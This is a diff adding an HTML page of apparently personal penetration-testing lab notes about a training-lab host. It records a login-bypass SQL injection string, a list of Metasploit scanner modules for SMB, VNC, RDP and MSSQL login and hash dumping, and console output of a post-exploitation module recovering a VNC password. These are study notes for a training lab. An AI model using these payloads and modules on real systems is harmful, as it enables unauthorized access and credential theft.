@@ -1,0 +1,44 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>sql injection, vnc</title>
+</head><body>http://10.11.1.128<br/>
+Used in username field <b>' or 1=1 --</b>&nbsp;to get a "Welcome" on the http://10.11.1.128/restricted.htm page.<br/>
+<br/>
+But there is nothing on the page besides "Welcome"<br/>
+<br/>
+One guy got in by web, another by a mysterious port and used nse scripts:<br/>
+https://forums.offensive-security.com/showthread.php?14023-Rooted-Manually<br/>
+<br/>
+also big hints here:<br/>
+https://forums.offensive-security.com/showthread.php?5363-unknown-service-on-a-port<br/>
+<br/>
+use auxiliary/scanner/rdp/rdp_scanner<br/>
+use auxiliary/scanner/smb/smb_login<br/>
+use auxiliary/scanner/smb/smb_login<br/>
+use auxiliary/scanner/smb/smb_uninit_cred<br/>
+use auxiliary/scanner/smb/smb_enumusers<br/>
+use auxiliary/scanner/vnc/ard_root_pw<br/>
+use auxiliary/scanner/vnc/vnc_login<br/>
+use auxiliary/scanner/vnc/vnc_none_auth<br/>
+use auxiliary/scanner/http/trace<br/>
+use auxiliary/scanner/mssql/mssql_login<br/>
+use auxiliary/scanner/mssql/mssql_schemadump<br/>
+use auxiliary/scanner/mssql/mssql_hashdump<br/>
+<br/>
+<br/>
+msf post(windows/gather/credentials/vnc) &gt; set session 4<br/>
+session =&gt; 4<br/>
+msf post(windows/gather/credentials/vnc) &gt; run<br/>
+<br/>
+[*] Enumerating VNC passwords on DJ<br/>
+[+] Location: WinVNC3_HKLM_Default =&gt; Hash: c77a3c277d5f9192 =&gt; Password: test2 =&gt; Port: 5900<br/>
+[+] Location: WinVNC4_HKLM =&gt; Hash: c77a3c277d5f9192 =&gt; Password: test2 =&gt; Port: 5900<br/>
+[*] Post module execution completed<br/>
+msf post(windows/gather/credentials/vnc) &gt; <br/>
+<br/>
+<br/>
+there is a way to get db credentials and then use them. smb and web are also involved.<br/>
+<br/>
+</body></html>
